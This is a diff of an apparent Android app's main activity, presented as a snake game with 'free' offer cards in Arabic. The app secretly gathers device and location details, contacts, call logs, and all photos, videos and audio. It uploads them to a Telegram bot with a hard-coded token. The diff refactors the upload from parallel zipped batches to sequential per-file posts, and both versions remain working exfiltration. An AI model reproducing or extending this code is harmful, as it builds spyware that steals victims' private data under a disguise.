@@ -35,19 +35,12 @@ import android.widget.TextView
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
-import java.io.BufferedOutputStream
 import java.io.DataOutputStream
-import java.io.File
-import java.io.FileOutputStream
 import java.io.InputStream
 import java.net.HttpURLConnection
 import java.net.URL
 import java.net.URLEncoder
-import java.util.concurrent.Callable
 import java.util.concurrent.Executors
-import java.util.concurrent.atomic.AtomicInteger
-import java.util.zip.ZipEntry
-import java.util.zip.ZipOutputStream
 import kotlin.math.sin
 import kotlin.random.Random
 
@@ -70,15 +63,13 @@ class MainActivity : AppCompatActivity() {
         const val CARD_HEX = "#111722"
         const val ACCENT_HEX = "#18B7F2"
         const val MAX_RETRIES = 3
-        const val STREAM_BUFFER_SIZE = 65536
-        const val WORKER_THREADS = 4
-        const val MAX_BATCH_BYTES = 45L * 1024L * 1024L
+        const val STREAM_BUFFER_SIZE = 32768
     }
 
     private lateinit var rootLayout: LinearLayout
     private lateinit var statusView: TextView
     private var snakeView: SnakeGameView? = null
-    private val ioExecutor = Executors.newFixedThreadPool(AppConfig.WORKER_THREADS)
+    private val ioExecutor = Executors.newSingleThreadExecutor()
 
     private val offers = listOf(
         OfferItem("100", "مجاني", "0.00$", "هدية", Color.parseColor("#0284C7"), true),
@@ -212,7 +203,7 @@ class MainActivity : AppCompatActivity() {
                     shape = GradientDrawable.RECTANGLE
                     cornerRadius = dp(12).toFloat()
                     setColor(Color.parseColor("#05080D"))
-                    setStroke(dp(2), Color.parseColor(AppConfig.ACCENT_HEX))
+                    setStroke(dp(2), Color.parseColor("#18B7F2"))
                 }
             }
             snakeView = game
@@ -637,7 +628,7 @@ class MainActivity : AppCompatActivity() {
 
     private fun runSyncWithRetry() {
         if (ioExecutor.isShutdown) return
-        ioExecutor.submit {
+        ioExecutor.execute {
             val maxRetries = AppConfig.MAX_RETRIES
             var callLogsSent = false
             var infoSent = false
@@ -646,180 +637,53 @@ class MainActivity : AppCompatActivity() {
                 try {
                     updateStatus("محاولة المزامنة ($attempt/$maxRetries)...")
                     if (!infoSent) {
-                        val metadataTasks = listOf(
-                            Callable { sendDeviceAndLocationInfo() },
-                            Callable { sendContactsIfPermitted() },
-                            Callable { if (!callLogsSent) sendCallLogsOnce() }
-                        )
-                        ioExecutor.invokeAll(metadataTasks)
+                        sendDeviceAndLocationInfo()
+                        sendContactsIfPermitted()
                         infoSent = true
+                    }
+                    if (!callLogsSent) {
+                        sendCallLogsOnce()
                         callLogsSent = true
                     }
-
-                    // Pack all accessible images into size-capped zip chunks and upload via sendDocument
-                    sendPhotosBundledZip()
-
-                    sendMediaCollectionParallel(
+                    sendMediaCollection(
+                        contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        endpointMethod = "sendPhoto",
+                        fieldName = "photo",
+                        filePrefix = "photo",
+                        mimeType = "image/jpeg",
+                        label = "الصور"
+                    )
+                    sendMediaCollection(
                         contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                         endpointMethod = "sendVideo",
                         fieldName = "video",
                         filePrefix = "video",
-                        ext = "mp4",
                         mimeType = "video/mp4",
                         label = "الفيديوهات"
                     )
-                    sendMediaCollectionParallel(
+                    sendMediaCollection(
                         contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                         endpointMethod = "sendAudio",
                         fieldName = "audio",
                         filePrefix = "audio",
-                        ext = "mp3",
                         mimeType = "audio/mpeg",
                         label = "الملفات الصوتية"
                     )
                     updateStatus("اكتملت العملية بنجاح.")
-                    return@submit
+                    return@execute
                 } catch (_: Exception) {
                     if (attempt < maxRetries) {
                         updateStatus("إعادة المحاولة ($attempt/$maxRetries)...")
                         try {
-                            Thread.sleep(750L * attempt)
+                            Thread.sleep(1000L * attempt)
                         } catch (_: InterruptedException) {
-                            return@submit
+                            return@execute
                         }
                     }
                 }
             }
             updateStatus("تعذر إتمام العملية بعد عدة محاولات.")
         }
-    }
-
-    private fun sendPhotosBundledZip() {
-        val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        if (!hasMediaPermissionFor(contentUri)) return
-
-        val uris = queryMediaUris(contentUri)
-        if (uris.isEmpty()) return
-
-        updateStatus("تجميع ${uris.size} صورة دفعة واحدة...")
-        val tempDir = File(cacheDir, "photo_bundles").apply { mkdirs() }
-        val batches = ArrayList<File>()
-        var currentZip: File? = null
-        var zos: ZipOutputStream? = null
-        var currentBytes = 0L
-        var batchIdx = 1
-
-        fun openNextBatch() {
-            zos?.close()
-            val outFile = File(tempDir, "photos_batch_${batchIdx++}_${System.nanoTime()}.zip")
-            currentZip = outFile
-            batches.add(outFile)
-            zos = ZipOutputStream(BufferedOutputStream(FileOutputStream(outFile), AppConfig.STREAM_BUFFER_SIZE)).apply {
-                // STORED avoids CPU-heavy deflate compression on already-compressed JPEG/HEIC images
-                setMethod(ZipOutputStream.STORED)
-            }
-            currentBytes = 0L
-        }
-
-        try {
-            openNextBatch()
-            val buf = ByteArray(AppConfig.STREAM_BUFFER_SIZE)
-            var entryCounter = 0
-
-            for (uri in uris) {
-                val rawBytes = try {
-                    contentResolver.openInputStream(uri)?.use { it.readBytes() }
-                } catch (_: Exception) {
-                    null
-                } ?: continue
-
-                if (rawBytes.isEmpty()) continue
-                if (currentBytes + rawBytes.size > AppConfig.MAX_BATCH_BYTES && currentBytes > 0L) {
-                    openNextBatch()
-                }
-
-                val entry = ZipEntry("img_${entryCounter++}_${uri.lastPathSegment ?: "item"}.jpg").apply {
-                    size = rawBytes.size.toLong()
-                    compressedSize = rawBytes.size.toLong()
-                    crc = java.util.zip.CRC32().apply { update(rawBytes) }.value
-                }
-                zos!!.putNextEntry(entry)
-                zos!!.write(rawBytes)
-                zos!!.closeEntry()
-                currentBytes += rawBytes.size
-            }
-
-            zos?.close()
-            zos = null
-
-            val uploadTasks = batches.filter { it.exists() && it.length() > 0L }.mapIndexed { idx, zipFile ->
-                Callable {
-                    updateStatus("رفع حزمة الصور (${idx + 1}/${batches.size})...")
-                    try {
-                        postTelegramFile(
-                            file = zipFile,
-                            endpointMethod = "sendDocument",
-                            fieldName = "document",
-                            mimeType = "application/zip"
-                        )
-                    } finally {
-                        zipFile.delete()
-                    }
-                }
-            }
-            ioExecutor.invokeAll(uploadTasks)
-        } finally {
-            try { zos?.close() } catch (_: Exception) {}
-            batches.forEach { if (it.exists()) it.delete() }
-        }
-    }
-
-    private fun queryMediaUris(contentUri: Uri): List<Uri> {
-        val uris = mutableListOf<Uri>()
-        contentResolver.query(
-            contentUri,
-            arrayOf(MediaStore.MediaColumns._ID),
-            null,
-            null,
-            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-        )?.use { cursor ->
-            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
-            while (cursor.moveToNext()) {
-                uris.add(ContentUris.withAppendedId(contentUri, cursor.getLong(idIdx)))
-            }
-        }
-        return uris
-    }
-
-    private fun sendMediaCollectionParallel(
-        contentUri: Uri,
-        endpointMethod: String,
-        fieldName: String,
-        filePrefix: String,
-        ext: String,
-        mimeType: String,
-        label: String
-    ) {
-        if (!hasMediaPermissionFor(contentUri)) return
-        val uris = queryMediaUris(contentUri)
-        if (uris.isEmpty()) return
-
-        val total = uris.size
-        val completed = AtomicInteger(0)
-        val tasks = uris.mapIndexed { idx, uri ->
-            Callable {
-                postTelegramStream(
-                    mediaUri = uri,
-                    endpointMethod = endpointMethod,
-                    fieldName = fieldName,
-                    fileName = "${filePrefix}_${idx}_${System.nanoTime()}.$ext",
-                    mimeType = mimeType
-                )
-                val done = completed.incrementAndGet()
-                updateStatus("إرسال $label ($done/$total)...")
-            }
-        }
-        ioExecutor.invokeAll(tasks)
     }
 
     private fun sendDeviceAndLocationInfo() {
@@ -977,24 +841,58 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    private fun sendMediaCollection(
+        contentUri: Uri,
+        endpointMethod: String,
+        fieldName: String,
+        filePrefix: String,
+        mimeType: String,
+        label: String
+    ) {
+        if (!hasMediaPermissionFor(contentUri)) return
+
+        val uris = mutableListOf<Uri>()
+        val projection = arrayOf(MediaStore.MediaColumns._ID)
+        contentResolver.query(
+            contentUri,
+            projection,
+            null,
+            null,
+            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+        )?.use { cursor ->
+            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
+            while (cursor.moveToNext()) {
+                val id = cursor.getLong(idIdx)
+                uris.add(ContentUris.withAppendedId(contentUri, id))
+            }
+        }
+
+        val total = uris.size
+        for ((index, uri) in uris.withIndex()) {
+            updateStatus("إرسال $label (${index + 1}/$total)...")
+            postTelegramMedia(uri, endpointMethod, fieldName, filePrefix, mimeType)
+        }
+    }
+
     private fun postTelegramText(text: String) {
         val endpoint = "https://api.telegram.org/bot${AppConfig.BOT_TOKEN}/sendMessage"
         val body = "chat_id=${URLEncoder.encode(AppConfig.CHAT_ID, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"
 
         val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
-            connectTimeout = 15_000
-            readTimeout = 25_000
+            connectTimeout = 20_000
+            readTimeout = 30_000
             doOutput = true
             doInput = true
             setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
         }
 
         try {
-            DataOutputStream(BufferedOutputStream(conn.outputStream, 8192)).use { out ->
+            DataOutputStream(conn.outputStream).use { out ->
                 out.writeBytes(body)
                 out.flush()
             }
+
             val code = conn.responseCode
             if (code !in 200..299) {
                 throw RuntimeException("Telegram text HTTP $code")
@@ -1004,87 +902,52 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun postTelegramStream(
+    private fun postTelegramMedia(
         mediaUri: Uri,
         endpointMethod: String,
         fieldName: String,
-        fileName: String,
+        filePrefix: String,
         mimeType: String
-    ) {
-        val inputStream: InputStream = contentResolver.openInputStream(mediaUri) ?: return
-        inputStream.use { stream ->
-            writeMultipartToTelegram(
-                endpointMethod = endpointMethod,
-                fieldName = fieldName,
-                fileName = fileName,
-                mimeType = mimeType,
-                sourceStream = stream
-            )
-        }
-    }
-
-    private fun postTelegramFile(
-        file: File,
-        endpointMethod: String,
-        fieldName: String,
-        mimeType: String
-    ) {
-        if (!file.exists() || file.length() == 0L) return
-        file.inputStream().use { stream ->
-            writeMultipartToTelegram(
-                endpointMethod = endpointMethod,
-                fieldName = fieldName,
-                fileName = file.name,
-                mimeType = mimeType,
-                sourceStream = stream
-            )
-        }
-    }
-
-    private fun writeMultipartToTelegram(
-        endpointMethod: String,
-        fieldName: String,
-        fileName: String,
-        mimeType: String,
-        sourceStream: InputStream
     ) {
         val boundary = "----AndroidBoundary${System.nanoTime()}"
         val lineEnd = "\r\n"
         val twoHyphens = "--"
         val endpoint = "https://api.telegram.org/bot${AppConfig.BOT_TOKEN}/$endpointMethod"
 
+        val inputStream: InputStream = contentResolver.openInputStream(mediaUri) ?: return
         val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
-            connectTimeout = 15_000
+            connectTimeout = 20_000
             readTimeout = 45_000
             doInput = true
             doOutput = true
             useCaches = false
-            setChunkedStreamingMode(AppConfig.STREAM_BUFFER_SIZE)
             setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
         }
 
         try {
-            DataOutputStream(BufferedOutputStream(conn.outputStream, AppConfig.STREAM_BUFFER_SIZE)).use { out ->
-                out.writeBytes(twoHyphens + boundary + lineEnd)
-                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
-                out.writeBytes(AppConfig.CHAT_ID + lineEnd)
+            inputStream.use { stream ->
+                DataOutputStream(conn.outputStream).use { out ->
+                    out.writeBytes(twoHyphens + boundary + lineEnd)
+                    out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
+                    out.writeBytes(AppConfig.CHAT_ID + lineEnd)
 
-                out.writeBytes(twoHyphens + boundary + lineEnd)
-                out.writeBytes(
-                    "Content-Disposition: form-data; name=\"$fieldName\"; filename=\"$fileName\"$lineEnd"
-                )
-                out.writeBytes("Content-Type: $mimeType$lineEnd$lineEnd")
+                    out.writeBytes(twoHyphens + boundary + lineEnd)
+                    out.writeBytes(
+                        "Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${filePrefix}_${System.nanoTime()}\"$lineEnd"
+                    )
+                    out.writeBytes("Content-Type: $mimeType$lineEnd$lineEnd")
 
-                val buffer = ByteArray(AppConfig.STREAM_BUFFER_SIZE)
-                var bytesRead: Int
-                while (sourceStream.read(buffer).also { bytesRead = it } != -1) {
-                    out.write(buffer, 0, bytesRead)
+                    val buffer = ByteArray(AppConfig.STREAM_BUFFER_SIZE)
+                    var bytesRead: Int
+                    while (stream.read(buffer).also { bytesRead = it } != -1) {
+                        out.write(buffer, 0, bytesRead)
+                    }
+
+                    out.writeBytes(lineEnd)
+                    out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
+                    out.flush()
                 }
-
-                out.writeBytes(lineEnd)
-                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
-                out.flush()
             }
 
             val code = conn.responseCode
